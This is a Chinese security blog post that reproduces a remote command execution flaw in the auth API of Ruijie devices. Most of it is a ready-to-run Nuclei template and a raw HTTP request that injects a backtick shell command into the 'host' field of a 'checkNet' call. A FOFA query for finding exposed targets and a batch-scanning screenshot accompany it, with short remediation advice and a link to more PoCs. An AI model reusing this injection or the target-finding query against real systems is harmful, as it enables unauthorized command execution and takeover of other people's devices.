#  锐捷系统auth接口处存在远程命令执行漏洞【漏洞复现|附nuclei-POC】   
原创 kingkong  脚本小子   2025-02-08 02:50  
  
****  
**免责声明：**  
**本文内容仅供技术学习参考，请勿用于违法破坏。利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，与作者无关。如有侵权请联系删除。**  
  
****  
****  
**漏洞描述：**  
  
锐捷系统auth接口处存在远程命令执行漏洞。  
攻击者  
可能利用此漏洞执行恶意命令，导致系统执行未授权的操作，获取服务器权限  
。  
  
  
01  
  
—  
  
**Nuclei POC**  
  
```
id: ruijie-auth-RCE

info:
  name: 锐捷系统auth接口处存在远程命令执行漏洞
  author: kingkong
  severity: high
  metadata:
    fofa-query: body="cgi-bin/luci" && body="#f47f3e"
    
http:
  - raw:
      - |
        POST /cgi-bin/luci/api/auth HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
        {"method":"checkNet","params":{"host":"`echo test123>test.txt`"}}
      
      - |
        GET /cgi-bin/test.txt HTTP/1.1
        Host: {{Hostname}}     
          
    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
              - 'status_code_1 == 200'
              - 'status_code_2 == 200'
              - 'contains(body_2,"test123")'
        condition: and
```  
  
  
02  
  
—  
  
搜索语法  
```
FOFA：body="cgi-bin/luci" && body="#f47f3e"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnfxh3a92HwMeQ17UZRnDtffD8coXdOdhX9dnpZ64vIZ9cU2kkNica2TEIvLQozibGdFYNqLZoNuwtGg/640?wx_fmt=png&from=appmsg "")  
  
  
界面如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnfxh3a92HwMeQ17UZRnDtffickr9iaUSLmv2Hr4ibCxNpbtBn7cDAic1DYwDp1gmWRUbk14icVPvVThiacg/640?wx_fmt=png&from=appmsg "")  
  
  
  
03  
  
—  
  
漏洞复现  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnfxh3a92HwMeQ17UZRnDtffsavbNQmgwmM3gjMYZDrSHVEThvlZShHAwkFrOdrXlfpIb2lkFzISfg/640?wx_fmt=png&from=appmsg "")  
  
漏洞验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnfxh3a92HwMeQ17UZRnDtff6ewbGISTLd20eWZ3ROAUHzBHpjVKiamJGtsUT2n3UMYPkn3vCNXficBw/640?wx_fmt=png&from=appmsg "")  
  
  
漏洞检测POC  
```
POST /cgi-bin/luci/api/auth HTTP/1.1
Host: 
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 65

{"method":"checkNet","params":{"host":"`echo test123>test.txt`"}}


GET /cgi-bin/test.txt HTTP/1.1
Host:


```  
  
  
neclei批量检测截图  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohnfxh3a92HwMeQ17UZRnDtffCusGsAof0ibfFyv4PKwA3srjezDRZbuVdQ6iaDb1icfzo2uaj1wrA6bicQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
  
04  
  
—  
  
修复建议  
  
  
1、输入验证：对所有用户输入进行严格的验证，确保只接受预期的格式。  
  
2、使用安全的API：使用安全的库或API来执行命令，避免直接调用系统命令。  
  
3、最小权限原则：确保应用程序仅在必要的权限下运行，限制可执行的命令。  
  
4、输出编码：对输出进行编码，以防止注入攻击。  
  
  
  
  
05  
  
—  
  
下载地址  
  
  
进入公众号点击POC可获取所有POC文件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/aEP4jW2ohneS7aOPfDNKhvOicibVlyrkJ3A4EuUx5c5S8eAxFnF9KiaibAGJfP6ibB6ze4Rm4pZ7MI4jQibT05lTevqg/640?wx_fmt=other&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
  
  
  
  
